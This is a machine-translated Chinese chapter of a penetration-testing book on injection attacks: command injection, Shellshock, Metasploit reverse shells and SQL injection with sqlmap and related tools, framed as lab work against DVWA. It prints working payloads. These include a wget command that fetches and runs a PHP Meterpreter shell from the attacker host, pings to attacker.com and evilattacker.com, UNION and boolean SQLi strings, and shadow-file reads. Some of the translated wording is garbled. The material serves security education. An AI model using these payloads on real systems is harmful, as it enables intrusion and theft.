# 第五章，利用基于注入的漏洞攻击服务器

web 应用程序中最常见的缺陷是注入缺陷。交互式 web 应用程序从用户处获取输入，对其进行处理，并将输出返回给客户端。当应用程序易受注入缺陷的攻击时，它接受来自用户的输入，但验证不正确或没有验证，并对其进行处理，从而导致应用程序不希望执行的操作。恶意输入欺骗应用程序，迫使底层组件执行应用程序未编程的任务。换句话说，注入漏洞允许攻击者控制应用程序的组件。

在本章中，我们将讨论主要的注塑缺陷，并涵盖以下主题：

*   命令注入缺陷
*   确定注射点
*   利用命令注入缺陷的工具
*   SQL 注入缺陷
*   缺陷的攻击潜力
*   Kali Linux 中利用 SQLi 的不同工具

注入缺陷用于访问应用程序正在向其发送数据以执行某些任务的底层组件。下表显示了 web 应用程序使用的最常见组件，当应用程序未对来自用户的输入进行消毒时，这些组件通常会成为注入攻击的目标：

<colgroup><col> <col></colgroup> 
| 

组件

 | 

注射缺陷

 |
| --- | --- |
| 操作系统外壳 | 命令注入 |
| 关系数据库（RDBMS） | SQL 注入 |
| 网络浏览器 | XSS 攻击 |
| LDAP 目录 | LDAP 注入 |
| XML | XPATH 注入 |

# 命令注入

Web 本质上是动态的应用程序可以使用脚本调用 Web 服务器上命令行中的某些功能，以处理从用户接收的输入。攻击者会绕过应用程序实现的输入验证过滤器，试图在命令行处理其输入。命令注入通常调用同一 web 服务器上的命令，但根据应用程序的体系结构，该命令可能在不同的服务器上执行。

让我们看一段易受命令注入漏洞攻击的简单代码。这是一个在线书店应用程序的示例，该应用程序从用户处获取输入，并显示特定类型的图书列表。使用`GET`方法传递输入，该方法映射到服务器上的目录名，并显示该目录中列出的文件：

```
<?php
  print("Specify the genre of book that you want to be listed");
  print("<p>");
  $Genre=$_GET['userinput'];
  system("ls –l $Genre | awk'{ print $9 }' ");
?>
```

如您所见，在接受用户的流派名称之前没有输入验证，这使得它容易受到命令注入攻击。恶意用户可能会使用以下请求导入应用程序将在不引发异常的情况下接受的其他命令：

```
http://onlinebookstore.com/list.php?userinput=Comics;uname -a
```

应用程序从客户端获取用户输入的值，而不进行验证，并将其连接到`ls -l`命令，以构建在 web 服务器上运行的最终命令。服务器的响应如以下屏幕截图所示；由于应用程序无法验证用户输入，底层操作系统的版本将与书籍列表一起显示：

![Command injection](../Images/image01134.jpeg)

注入的额外的命令将以 web 服务器的权限运行。如今，大多数 web 服务器都以受限权限运行，但即使权限有限，攻击者也可以利用并窃取重要信息。

## 识别参数注入数据

当您正在测试一个 web 应用程序的命令注入缺陷，并且您已经确定该应用程序正在与底层操作系统的命令行交互时，下一步应该是操作和探测应用程序中的不同参数，并查看它们的响应。应测试以下参数是否存在命令注入缺陷，因为应用程序可能正在使用其中一个参数在 web 服务器上重新生成命令：

*   `GET`：在该方法中，输入参数以 URL 发送。在前面显示的示例中，来自客户端的输入使用`GET`方法传递到服务器，容易受到命令注入漏洞的攻击。应测试使用`GET`方法请求发送的任何用户控制参数。
*   `POST`：此方法将输入参数发送到 HTTP 主体中。与使用`GET`方法传递的输入类似，从最终用户获取的数据也可以使用 HTTP 请求主体中的`POST`方法传递。然后 web 应用程序可以使用它在服务器端构建命令查询。
*   `HTTP header`：应用程序通常使用标题字段来识别最终用户，并根据标题中的值向用户显示自定义信息。应用程序还可以使用这些参数来构建进一步的查询。检查命令注入的一些重要头字段是：

    *   Cookies
    *   X-Forwarded-for
    *   用户代理
    *   推荐人

## 基于错误的盲命令注入

当您通过输入参数携带命令，并且该命令的输出显示在 web 浏览器中时，很容易识别应用程序是否容易受到命令注入漏洞的攻击。输出的形式可能是错误，也可能是您试图运行的命令的实际结果。作为攻击者，您将根据应用程序使用的 shell 修改和添加其他命令，并从应用程序中收集信息。当输出显示在 web 浏览器中时，称为基于错误或非盲命令注入。

在另一种形式的命令注入（即盲命令注入）中，您注入的命令的结果不会显示给用户，也不会返回错误消息。攻击者必须依靠其他方法来确定该命令是否确实在服务器上执行。当命令的输出显示给用户时，您可以使用 bashshell 或 windows 命令中的任何一个，例如`ls`、`dir`、`ps`或`tasklist`，具体取决于底层操作系统。但是，在测试盲注入时，需要仔细选择命令。作为一名道德黑客，当应用程序不显示结果时，最可靠和安全的方法是使用`ping`命令来识别注入缺陷的存在。

攻击者可以注入`ping`命令，将网络数据包发送到其控制下的机器，并使用数据包捕获在该机器上查看结果。这可能在以下几个方面很有用：

*   由于`ping`命令在 Linux 和 Windows 中都是类似的，除了一些更改之外，如果应用程序容易受到注入缺陷的攻击，那么该命令肯定会运行。
*   通过分析`ping`输出中的响应，攻击者还可以使用 TTL 值识别底层操作系统。
*   它还可以让攻击者了解防火墙及其规则，因为目标环境允许 ICMP 数据包通过其防火墙。这可能在攻击的后期阶段很有用，因为 web 服务器有一条通往攻击者的路径。
*   `ping`效用通常不受限制；即使应用程序在非特权帐户下运行，也可以保证执行命令的机会。
*   输入缓冲区的大小通常有限，只能接受有限数量的字符，例如用户名的输入字段。`ping`命令以及 IP 地址和一些附加参数可以很容易地插入到这些字段中。

## 用于命令分隔符的元字符

在前面显示的示例中，分号用作元字符，用于分隔实际输入和尝试注入的命令。除了分号，还有其他几个元字符可用于注入命令。开发人员可以设置筛选器来阻止分号元字符。这将阻止我们注入的数据，因此我们也需要对其他元字符进行实验，如下表所示：

<colgroup><col> <col></colgroup> 
| 

象征

 | 

用法

 |
| --- | --- |
| `;` | 分号是用于测试注入缺陷的最常见元字符。shell 将按分号分隔的顺序运行所有命令。 |
| `&&` | 只有在左侧的命令成功执行时，双符号 AND 才会运行元字符右侧的命令。例如，注入密码字段以及正确的凭据。可以插入一个命令，该命令将在用户通过系统身份验证后运行。 |
| `&#124;&#124;` | 双管道元字符与双符号 AND 正好相反。只有当左侧的命令失败时，它才会在右侧运行该命令。以下是此命令的示例：`cd invalidDir &#124;&#124; ping -c 2 attacker.com` |
| `( )` | 使用分组元字符，可以组合多个命令的输出并将其存储在文件中。以下是此命令的示例：`(ps; netstat) > running.txt` |
| ``` | 取消引用元字符用于强制 shell 在反勾号之间解释和运行命令。以下是此命令的示例：`Variable= "OS version `uname -a`" && echo $variable` |
| `>>` | 该字符将把左侧命令的输出附加到该字符右侧名为的文件中。以下是此命令的示例：`ls –la >> listing.txt` |
| `&#124;` | 单个管道将使用左侧命令的输出作为右侧指定命令的输入。以下是此命令的示例：`netstat -an &#124; grep :22` |

作为攻击者，您必须经常使用前面的元字符组合来绕过开发人员设置的过滤器，以便注入您的命令。

## 命令注入扫描

Kali Linux 有一个称为 Wapiti 的 web 应用程序扫描器。它是一个命令行工具，可以自动扫描网站以发现漏洞。不分析应用代码；它扫描应用程序中的脚本和输入表单以注入数据，类似于 fuzzer 的工作方式。它注入数据并分析响应。马鹿支持使用`GET`和`POST`两种方法进行注射。通过注入数据，它可以检测以下漏洞：

*   **命令注入**：这涉及到将数据注入表单以利用 eval 和系统函数调用
*   **XSS**：这涉及将脚本注入表单，以测试跨站点脚本缺陷
*   **CRLF**：这涉及在 HTTP 报头中注入数据，以测试响应拆分和会话固定
*   **SQL 注入**：这涉及通过使用各种技术注入数据来识别盲目和基于错误的 SQL 注入缺陷

通过利用 include 函数调用，Wapiti 还可以测试文件处理缺陷。除此之外，它还扫描服务器上可访问的旧备份文件，并尝试绕过弱 htacess 配置。

该工具可在**应用程序****Web 应用程序分析****Web 漏洞扫描程序****马鹿**中找到。该工具使用的重要选项如下：

<colgroup><col> <col></colgroup> 
| 

选择权

 | 

描述

 |
| --- | --- |
| `-f` | 输出格式（html、txt 或 xml） |
| `-o` | 保存输出文件的名称和文件夹 |
| `-v` | 详细级别（建议值为 2） |
| `-m` | 要选择的模块（crlf、exec、xss 或 sql） |
| `-c` | cookie 文件的路径 |

`-c`或`-cookie`选项将允许您选择一个 cookie 文件，该文件可用于对应用程序进行身份验证。cookie 文件可以使用随 Wapiti 工具提供的`getcookie.py`脚本生成。当提供登录页面的 URL 和凭据时，脚本可以登录并保存分配给用户的 cookie。

在下一个示例中，我们将利用我们在[第 4](14.html#aid-2QJ5E1 "Chapter 4. Major Flaws in Web Applications")章*web 应用程序*中下载的 OWASP 断开的 web 应用程序虚拟机中提供的**该死的易受攻击 web 应用程序**（**DVWA**中的命令注入漏洞进行攻击。

我的实验室中命令注入漏洞的 URL 为`http://192.168.1.70/dvwa/vulnerabilities/exec/`。

如果 Wapiti 只提供了前面的 URL，那么该工具将无法插入任何数据，因为应用程序需要用户登录，并且当您访问前面提到的页面时，它会重定向到登录页面。因此，我们需要为该工具提供一个 cookie 文件，其中包含一个有效的会话 ID，在注入数据之前，Wapiti 可以使用该 ID 登录。

### 创建用于身份验证的 cookie 文件

如下面的屏幕截图所示，`wapiti-getcookie`脚本需要一个输出文件和登录页面的 URL 作为输入。然后，脚本将扫描登录页面中的用户名和密码字段，并提示输入凭据。用户名和登录名通常相同。对于 DVWA 应用程序，登录和密码设置为`user`，如下图所示：

![Creating a cookie file for authentication](../Images/image01135.jpeg)

生成的 cookie 文件采用 JSON 格式，如以下屏幕截图所示：

![Creating a cookie file for authentication](../Images/image01136.jpeg)

### 处决马鹿

一旦我们有了 cookie 文件，我们就可以配置 Wapiti 来扫描应用程序，以识别命令注入缺陷，如下面的屏幕截图所示：

![Executing Wapiti](../Images/image01137.jpeg)

如前面的屏幕截图所示，我们仅选择`exec`模块，仅使用`POST`方法注入数据。如果只测试特定缺陷，则需要添加`–all`选项，这不包括所有其他模块。例如，如果您正在测试 XSS 漏洞，请使用 `–m "-all,xss:post"`。这将在应用程序中注入数据，以便使用`POST`方法仅测试 XSS 漏洞。

HTML 输出整洁，列出了漏洞，如下面的屏幕截图所示。该图后面是一个简短的描述和解决方案，以缓解该漏洞。还为漏洞指定了风险级别，报告中的关键缺陷以红色突出显示：

![Executing Wapiti](../Images/image01138.jpeg)

## 使用 Metasploit 开发命令注入

在识别命令注入时，漏洞是其中的一部分，利用漏洞并在风险方面向客户强调漏洞是很重要的。当您暴露应用程序中的缺陷时，应用程序开发团队和您的客户总是会问以下问题：

*   此缺陷的后果是什么？
*   此缺陷将如何影响我们 IT 基础架构的稳定性？
*   此漏洞是否会暴露我们组织的敏感数据？

为了回答前面的问题，我们需要一个概念证明来解释这种缺陷的深远影响。此外，如果我们能够在渗透测试期间成功利用此类缺陷，我们就可以访问内部网络上的系统，然后转向并攻击网络上的其他机器。以下是利用命令注入缺陷可以执行的一些活动：

*   在 web 服务器上查看文件
*   删除 web 服务器上的文件
*   攻击组织内部网络上的其他计算机
*   完全由于 web 服务器

### PHP 外壳和 Metasploit

演示在基于 PHP 构建的应用程序中利用命令注入漏洞可以使用 Metasploit 完成。以下是我们将执行的步骤：

1.  使用 msfvenom 工具创建 PHP shell。
2.  将其上载到可从目标访问的 web 服务器上。
3.  在攻击者的机器上的 Metasploit 中设置反向 TCP MeterMeter 会话，等待目标连接。
4.  将 PHP 外壳的 URL 注入应用程序的易受攻击字段，该字段将下载 PHP 外壳并在服务器上运行。
5.  然后，shell 将与等待攻击者机器上的 MeterMeter 会话建立出站 TCP 连接。

### 注

PHP shell 只是一个用 PHP 脚本包装的 shell。

我们首先使用 msfvenom 创建一个 PHP shell。以前，msfpayload 和 msfencode 是 Metasploit 框架中提供的两个工具，用于创建各种格式的编码有效负载。新的 msfvenom 工具将这两个工具的功能集成到一个工具中，这将加快在单个命令行上创建有效负载的过程。有关 msfvenom 及其不同命令行选项的更多信息，请参见[https://www.offensive-security.com/metasploit-unleashed/msfvenom/](https://www.offensive-security.com/metasploit-unleashed/msfvenom/) 。

在我的实验室中，攻击者机器的 IP 地址为`192.168.1.69`，目标机器的 IP 地址为`192.168.1.70`：

![PHP shell and Metasploit](../Images/image01139.jpeg)

`–p`选项指定要使用的有效负载。在本例中，我们使用的是 PHP MeterMeter 负载。MeterMeter 是一种外壳负载，它使用 DLL 注入技术，完全驻留在内存中，不会在磁盘上留下任何封装外形。一旦建立了 MeterMeter 外壳，就可以在目标计算机上通过它运行命令。`reverse_tcp`选项指定 MeterMeter 外壳将创建到攻击者机器的出站连接，称为反向 TCP 连接。这样做是因为当流量从内部流向外部时，防火墙规则通常更为宽松。

使用`LHOST`参数，您需要指定您控制的机器的 IP 地址，即：；攻击者的机器。`LPORT`参数指定 MeterMeter 会话连接的端口。

`–e`选项指定要使用的编码器。在本例中，我们使用的是 base64 编码器。然后使用`–f`选项将有效负载导出到文本文件中。这里，我们选择输出格式为 raw，它将以机器语言导出 shell。

然后，我们需要编辑`phpshell.txt`文件，以包含 PHP 开始和结束标记，从而使服务器端 PHP 脚本引擎能够正确解析该文件：

![PHP shell and Metasploit](../Images/image01140.jpeg)

接下来，我们需要找到一种方法，使这个 PHP shell 可以从目标系统访问。一种简单的方法是将此文件托管在 web 服务器上。Python 允许您仅使用一个命令将文件夹转换为 web 目录。您需要首先将目录更改为保存`phpshell.txt`文件的目录，并使用 Python 提供的 SimpleHTTPServer 库开始通过 web 服务器提供该文件：

![PHP shell and Metasploit](../Images/image01141.jpeg)

工作只完成了一半；我们需要启动并运行 MeterMeter，以便 web 服务器能够连接到攻击者的机器，然后将`phpshell.txt`文件的 URL 插入目标 web 应用程序上的易受攻击的输入字段中。要在 Metasploit 中运行的命令显示在以下屏幕截图中：

![PHP shell and Metasploit](../Images/image01142.jpeg)

在 web 应用程序的易受攻击字段中插入以下命令：

```
;wget http://192.168.1.69/phpshell.txt -O /tmp/phpshell.php;php -f /tmp/phpshell.php

```

我们将`phpshell.txt`文件保存在 tmp 目录中，因为所有用户帐户都有权写入该目录。然后，我们使用`–f`选项执行该文件。在 vulnerable 字段中注入的已完成命令如以下屏幕截图所示：

![PHP shell and Metasploit](../Images/image01143.jpeg)

只要点击提交，您就会在 MeterMeter 屏幕上看到一些活动：

![PHP shell and Metasploit](../Images/image01144.jpeg)

由于我们使用的是 PHP MeterMeter 有效负载，因此我们无法获得 Windows MeterMeter 有效负载中可用的全部命令集，但仍然很有用。

## 冲击波

shellshock 漏洞于 2014 年 9 月被发现，并分配了初始 CVE 标识符 2014-6271。Shellshock 是一个**任意代码执行**（**ACE**）漏洞，被认为是迄今发现的最严重缺陷之一。任意代码执行漏洞通常很难消除，需要一定的应用程序设计和架构知识，但 shellshock 漏洞不需要利用这些知识。

### shellshock 概述

该漏洞是在多年前开发的 bash shell 中发现的，攻击者只需将一系列特定字符串传递给 bash shell 即可利用该漏洞：

```
() { :; };

```

当 bashshell 接收到前面的一组字符和变量时，而不是拒绝字符串，bashshell 会接受它和后面的变量，并在服务器上作为命令执行它。

正如我们在前面利用命令注入漏洞时所看到的，bashshell 通常用于 Linux web 服务器，并且您经常会看到 web 应用程序将变量传递给 bashshell 以执行某些任务。下面的屏幕截图显示了 shellshock 漏洞的一个示例，攻击者正在更改`User-Agent`标题字段。如果应用程序正在将**用户代理**字段中的字符传递给 bash shell，则会对其执行`ping –c 2 evilattacker.com`命令：

![Overview of shellshock](../Images/image01145.jpeg)

bashshell 将变量解释为命令并执行它，而不是将变量作为字符序列接受。这看起来与我们前面讨论的命令注入缺陷非常相似，但是这里的主要区别是 bashshell 本身容易受到代码注入的攻击，而不是网站。由于许多应用程序（如 DHCP、SSH、SIP 和 SMTP）都使用 bash shell，因此攻击面在很大程度上增加。利用 HTTP 请求上的漏洞仍然是最常见的方法，因为 bash shell 通常与 CGI 脚本一起使用。

### 扫描–dirb

为了说明对 shellshock 漏洞的利用，我们需要首先识别易受代码注入漏洞攻击的 URL。在下一个示例中，我们使用的是可以在**应用程序****Web 应用程序分析****Web 爬虫和目录暴力处理**下找到的 dirb 工具。该工具将使用字典搜索`cgi-bin`目录和隐藏的 web 对象。CGI 是 web 应用程序与命令行可执行文件交互的通用标准；因此，CGI 脚本最容易受到 shellshock 攻击。

Dirb 发现了一些目录和 web 对象，但`/cgi-bin/status`是我们感兴趣的。有了这些信息，让我们转到 Metasploit，并尝试利用 shellshock 漏洞：

![Scanning – dirb](../Images/image01146.jpeg)

### 开发——元 Sploit

在 Metasploit 中，我们需要选择**漏洞****多****http**下的`apache_mod_cgi_bash_env_exec`漏洞。然后我们需要定义远程主机和目标 URI 值。我们还需要选择使 web 服务器连接到攻击者机器的`reverse_tcp`有效负载，可以在**linux****x86****米表**上找到。

确保本地主机和本地端口值正确，并且所选端口上没有正在运行的服务：

![Exploitation – Metasploit](../Images/image01147.jpeg)

一旦您准备就绪，输入`exploit`，如果服务器容易受到外壳电击，您将收到一个 MeterMeter 提示。外壳是黑客最宝贵的财产。MeterMeter 会话在开发后阶段是一个非常有用的工具。正是在攻击后阶段，您才了解您所破坏的机器的价值。MeterMeter 有大量内置命令。下面列出了用于 MeterMeter 的几个有用的命令：

*   `getsystem`：此命令将尝试获取机器上的系统级访问权限。这在修补版本的 Windows 上可能不起作用，MeterMeter 会话应使用管理级别的权限运行。
*   `download`：此命令将从远程机器检索文件，当您想要在目标计算机上下载更多工具时，此命令非常有用。
*   `hashdump`：此将转储 SAM 数据库的内容，其中包含用户密码的哈希。
*   `sysinfo`：此将显示目标的相关信息。
*   `help`：此命令将显示 MeterMeter 帮助菜单，可帮助您运行更多命令。

以下屏幕显示了`sysinfo`命令的输出：

![Exploitation – Metasploit](../Images/image01148.jpeg)

# SQL 注入

与后端数据库交互以检索和写入数据是 web 应用程序执行的最关键任务之一。将数据存储在一系列表中的关系数据库通常用于实现这一点。从后端数据库查询数据是使用 SQL 完成的。

从 Cookie、输入表单和 URL 变量获取的输入用于构建 SQL 语句，这些 SQL 语句被传递回数据库进行处理。由于构建 SQL 语句涉及用户输入，因此应用程序的开发人员需要在将其传递到后端数据库之前仔细验证它。

## SQL 语句

为了理解 SQL 注入缺陷，您需要具备一些 SQL 的知识。结构化查询语言允许开发人员对数据库执行以下操作：

<colgroup><col> <col></colgroup> 
| 

陈述

 | 

描述

 |
| --- | --- |
| `SELECT` | 它允许从数据库中检索信息 |
| `UPDATE` | 它允许修改数据库中的现有数据 |
| `INSERT` | 它允许在数据库中插入新数据 |
| `DELETE` | 它可以从数据库中删除数据 |

大多数合法的 SQL 任务都是使用前面的语句执行的，尽管如果使用不受控制，`DELTE`语句可以用于 DoS 攻击。

### 提示

SQL 语句中的分号（`;`元字符的使用方式与命令注入中用于在同一行上组合多个查询的方式类似。

### 联合运营商

为了测试输入字段是否存在 SQL 注入缺陷，最有用的 SQL 语句之一是`UNION`运算符。使用分号元字符组合两个 SQL 语句的一个主要限制是，大多数 web 应用程序设计为只显示一个查询的结果，尽管两个查询都会在数据库上运行。如果运行多个以分号分隔的查询，应用程序很可能只显示第一个查询的结果，因为它是由开发人员创建的。应用程序将完全忽略与第一个查询同时出现的第二个查询的结果。

为了避免这个问题，我们可以使用`UNION`语句，它将两个语句的结果组合成一个集合。使用`UNION`语句，我们还可以从数据库的其他表中查询数据。使用`UNION`语句的唯一限制是两个查询中的列数和数据类型应该相同：

```
SELECT id,rackname,value FROM inventory WHERE id=10 UNION SELECT SSN,name,address FROM employees

```

如果要查询的表的列数不相同，则必须使用填充来完成语句。如下面的例子所示，`employees`表只有两列，所以我们用`1`填充剩余的列：

```
SELECT id,rackname,value FROM inventory WHERE id=10 UNION SELECT (SSN,name,1) FROM employees

```

为了在第一次查询的表中找到确切的列数，我们可以使用`ORDER BY`语句并要求数据库显示按列数排序的结果。如果`ORDER BY`语句中的列数大于表中的列数，则返回错误。使用此错误，可以使用试错法确定列数。命令如下：

```
SELECT name,location,age FROM contractors ORDER BY 5

```

### SQL 查询示例

您经常在网站上看到的一个常见的查询是使用`SELECT`语句从数据库中检索一些信息，如下命令所示：

```
SELECT columnA FROM tableX WHERE columnE='employee' AND columnF=100;

```

如果满足`WHERE`子句后面的条件，即`columnE`具有字符串值`employee`，而`columnF`具有值`100`，则前面的 SQL 语句将从名为`tableX`的表返回`columnA`中的值。

与前面讨论的命令注入缺陷类似，使用`GET`方法传递的变量也经常用于构建 SQL 语句。例如，URL`/books.php?userinput=1`将显示关于第一本书的信息。

在下面的 PHP 代码中，用户通过`GET`方法提供的输入将直接回显到 SQL 语句中。`MySQL_query()`函数将 SQL 查询发送到数据库，`MySQL_fetch_assoc()`函数将从数据库中获取数组格式的数据：

```
<?php
  $stockID = $_GET["userinput"];
  $SQL= "SELECT * FROM books WHERE stockID=".$userinput;
  $result= MySQL_query($SQL);
  $row = MySQL_fetch_assoc($result);
?>
```

如果没有正确的输入验证，攻击者可以控制 SQL 语句。如果将 URL 更改为`/books.php?userinput=10-1`，将向后端数据库发送以下查询：

```
SELECT * FROM books WHERE stockID=10-1

```

如果显示关于第九本书的信息，我们可以得出结论，应用程序容易受到 SQL 注入攻击，因为未过滤的输入直接发送到执行减法的数据库。

### 注

SQL 注入缺陷存在于 web 应用程序中，而不是数据库服务器上。

## SQL 注入漏洞的攻击潜力

以下是处理 SQL 注入缺陷的技术：

*   通过更改 SQL 查询，攻击者可以从数据库中检索用户无权访问的额外数据。
*   通过从数据库中删除关键数据来运行 DoS 攻击。
*   绕过身份验证并执行权限提升攻击。
*   使用批处理查询，可以在单个请求中执行多个 SQL 操作。
*   高级 SQL 命令可用于枚举数据库的模式，然后更改结构。
*   使用`load_file()`功能读取和写入数据库服务器上的文件，使用`into outfile()`功能写入文件。
*   诸如 Microsoft SQL 之类的数据库允许操作系统命令通过使用`xp_cmdshell`的 SQL 语句运行。易受 SQL 注入攻击的应用程序可使攻击者完全控制数据库服务器，并通过它攻击网络上的其他设备。

## 盲 SQL 注入

所有主要的编程语言都有内置的错误处理功能，可以帮助开发人员调试和修复他们的应用程序。这些错误消息在利用 SQL 注入缺陷时非常有用，因为它提供了有关数据库类型和与其相关的元数据的信息。在基于错误的 SQL 注入缺陷中，错误消息显示在网页上，这有助于攻击者构建正确的 SQL 查询以利用该缺陷。

有时，注入的 SQL 查询可能由于语法错误或查询在特定数据库类型上无效而无法在数据库上正确执行。如果应用程序隐藏了数据库生成的真实错误消息，并在向最终用户显示的网页上显示了一条通用错误消息，则称为盲 SQL 注入。

应用程序可能仍然容易受到 SQL 注入漏洞的攻击，但攻击者手头有一项艰巨的任务，因为错误消息不是描述性的，它们必须依靠假设和一些猜测来确定正确的 SQL 语句。

为了进一步理解这一点，我们将举一个小例子。假设应用程序易受 SQL 注入缺陷的攻击；您已经用 SQL 语句注入了一些输入字段，但不确定数据库是否正确地接受和响应了这些查询。为了克服这个问题，我们必须向数据库询问一个正确或错误的问题，并解释响应以确定它是否易受攻击。我们在这里构建一个查询，该查询将生成布尔值，然后将分析生成的输出 HTML 页面。

在下面的 URL 中，我们正在注入一个`AND`操作符：

```
http://www.example.org/list.php?id=20 AND 1=1

```

使用`AND`操作符，我们可以完全根据注入的数据强制查询成功或失败。如果我们注入了`AND 1=2`（这是错误的），应用程序将加载不同的页面。如果页面内容在“真”和“假”条件下都不同，攻击者可以使用该页面来确定漏洞的存在。

## SQL 注入测试方法

测试 SQL 注入的应用程序涉及多个步骤。对于不同的数据库系统，有不同版本的 SQL 语言。数据库的每个供应商都以不同的方式实现了一些功能。注入正确的 SQL 查询在很大程度上取决于枚举和收集的有关数据库系统的信息。测试 SQL 注入的步骤如下：

1.  扫描 SQL 注入。
2.  信息收集。
3.  提取数据。
4.  利用数据库服务器。

### SQL 注入扫描

第一步应该检查 HTML 表单中的输入字段、URL 查询字符串中的脚本参数、存储在 cookie 中的值以及隐藏字段。一旦识别出这些字段，我们需要通过注入元字符、SQL 语句、运算符和保留字将数据模糊化到这些字段中。这一步可以通过手动或自动技术完成。使用 Burp suite 入侵者模块和 SQLInjectMeFirefox 插件等工具，可以根据输入字段测试各种 SQL 注入语句。

### 信息收集

由于不同数据库系统之间的 SQL 语法不同，我们必须在利用该漏洞之前识别数据库类型和版本。错误消息将帮助您识别应用程序正在使用的数据库引擎。如果错误消息描述不充分，可以根据 web 服务器类型和操作系统进行有根据的猜测。Linux 上的 Apache web 服务器更可能使用 MySQL 数据库，而不是 MS SQL 数据库。

您还可以使用辅助 Metasploit 模块和 nmap 确定 MySQL 数据库版本，如下所示：

![Information gathering](../Images/image01149.jpeg)

在 Metasploit 中，您必须选择`mysql_version`辅助模块才能找到 MySQL 数据库的确切版本，如下图所示：

![Information gathering](../Images/image01150.jpeg)

## Sqlmap–自动开发

Kali Linux 中的工具 Sqlmap 自动发现 SQL 注入缺陷的过程，准确猜测数据库类型，并利用注入缺陷控制整个数据库服务器。

sqlmap 的一些特性如下所示：

*   支持所有主要数据库系统
*   对基于错误和盲 SQL 注入都有效
*   可以枚举表名和列名，还可以提取用户和密码哈希
*   通过利用注入漏洞支持下载和上载文件
*   可以在数据库服务器上运行 shell 命令
*   与 Metasploit 的集成

在 Kali Linux 2.0 中，可以在**应用程序****数据库评估**中找到 sqlmap。要使用该工具，首先需要找到一个要测试 SQL 注入的输入参数。如果变量通过`GET`方法传递，您可以向 sqlmap 工具提供 URL，该工具将自动进行测试。您还可以显式地告诉 sqlmap 使用`–p`选项仅测试特定参数。在下面的示例中，我们正在测试变量`id`的注入缺陷。如果发现易受攻击，`–dbs`选项将列出数据库：

![Sqlmap – automating exploitation](../Images/image01151.jpeg)

如果使用`POST`方法传递要注入的参数，则可以提供一个 HTTP 文件作为 sqlmap 的输入，该文件包含头和参数。当捕获流量时，通过复制**原始**选项卡下显示的数据，可以使用代理（如 Burp）生成 HTTP 文件。该文件类似于以下屏幕截图所示的文件：

![Sqlmap – automating exploitation](../Images/image01152.jpeg)

然后可以提供 HTTP 文件作为 sqlmap 的输入。`–threads`选项用于选择向应用程序并发 HTTP 请求的数量。`–dbs`选项将列出数据库。

![Sqlmap – automating exploitation](../Images/image01153.jpeg)

确定数据库类型后，可以使用`–tables`和`–columns`选项提取表和列信息：

![Sqlmap – automating exploitation](../Images/image01154.jpeg)

通过`POST`方法测试 SQL 注入的另一种方法是使用`–data`选项。在这里，您必须提供发送`POST`请求时所需的准确参数。以下是下一个示例中使用的选项：

*   `--method`：选择方法（`POST`或`GET`）
*   `--data`：这将传递`POST`方法所需的参数
*   `-p`：这将指定可注入字段（在本例中，`loginName`是可注入字段）

让我们看一个使用`–data`选项的示例：

![Sqlmap – automating exploitation](../Images/image01155.jpeg)

攻击者的目标是利用 SQL 注入漏洞在服务器上获得进一步的立足点。使用 sqlmap，您可以利用注入缺陷在数据库服务器上读写文件，注入缺陷会调用目标上的`load_file()`和`out_file()`函数来完成该操作。在以下示例中，我们正在读取卷影文件的内容：

![Sqlmap – automating exploitation](../Images/image01156.jpeg)

下表显示了 sqlmap 工具提供的几个额外的选项：

<colgroup><col> <col></colgroup> 
| 

选项

 | 

描述

 |
| --- | --- |
| `-f` | 执行数据库的扩展指纹 |
| `-b` | 检索 DBMS 横幅 |
| `--sql-shell` | 成功利用此漏洞后访问 SQL shell 提示符 |
| `--schema` | 枚举数据库架构 |
| `--comments` | 在数据库中搜索注释 |
| `--reg-read` | 读取 Windows 注册表项值 |
| `--identify-waf` | 识别 WAF/IPS 保护 |

可以在以下 GitHub 项目页面中找到可用于 sqlmap 的所有选项的详细列表：

[https://github.com/sqlmapproject/sqlmap/wiki/Usage](https://github.com/sqlmapproject/sqlmap/wiki/Usage)

## BBQSQL——盲 SQL 注入框架

Kali Linux 有一个专门为利用盲 SQL 注入漏洞而创建的工具。BBQSQL 是一个用 Python 编写的工具。这是一个菜单驱动的工具；它会询问几个问题，然后根据回答构建注入攻击。它是一个速度更快的工具，可以自动测试盲目的 SQL 注入缺陷，具有极高的准确性。

bbqsql 工具可以配置为使用二进制搜索或频率搜索技术。还可以对其进行定制，以便在来自应用程序的 HTTP 响应中查找特定值，以确定 SQL 注入是否有效。

如下图所示，该工具提供了一个漂亮的菜单驱动向导，其中 URL 和参数在第一个菜单和输出文件中定义，使用的技术和响应解释规则在第二个菜单中定义：

![BBQSQL – the blind SQL injection framework](../Images/image01157.jpeg)

## Sqlsus–MySQL 注入

Sqlsus 是专门为测试 MySQL 注入缺陷而创建的工具。它是用 Perl 编写的，不像 sqlmap 是用 Python 编写的。Sqlsus 以其允许在给定时间内运行大量查询的速度和效率而闻名。它使用堆叠子查询和智能注入算法，提高了利用注入缺陷的机会。

sqlsus 工具可在**应用程序****数据库评估**中找到。当您第一次使用该工具时，需要生成一个配置文件。这可以使用`–g`选项完成：

![Sqlsus – MySQL injection](../Images/image01158.jpeg)

配置文件存储与注入攻击相关的所有重要信息。要测试的 URL 是此处定义的第一个选项。其他重要的选项是在注入数据的`GET`和`POST`方法之间进行选择，并选择基于时间或基于布尔的注入模式。一旦定义了所需的变量，就可以将配置文件作为输入提供给 sqlsus 工具。命令如下：

```
Sqlsus sqlsys.cnfg

```

示例配置文件如下所示：

![Sqlsus – MySQL injection](../Images/image01159.jpeg)

## Sqlninja–MS SQL 注入

sqlninja 工具可以帮助您利用使用 Microsoft SQL server 作为后端数据库的应用程序上的 SQL 注入缺陷。使用 sqlninja 工具的最终目的是通过 SQL 注入缺陷获得对数据库服务器的控制。它是用 Perl 编写的工具，可以在**应用程序****数据库评估**中找到。Sqlninja 不是检测注入缺陷存在的工具，而是利用该缺陷获得对数据库服务器的 shell 访问权的工具。以下是 sqlninja 的一些重要特性：

*   对远程 SQL server 进行指纹识别，以识别版本、用户权限、数据库身份验证模式和`xp_cmdshell`可用性
*   通过 SQLi 上传目标上的可执行文件
*   与 Metasploit 的集成
*   通过使用模糊代码使用 WAF 和 IPS 规避技术
*   使用 DNS 和 ICMP 协议的 Shell 隧道
*   在旧版本的 MS SQL 上强制使用“sa”密码

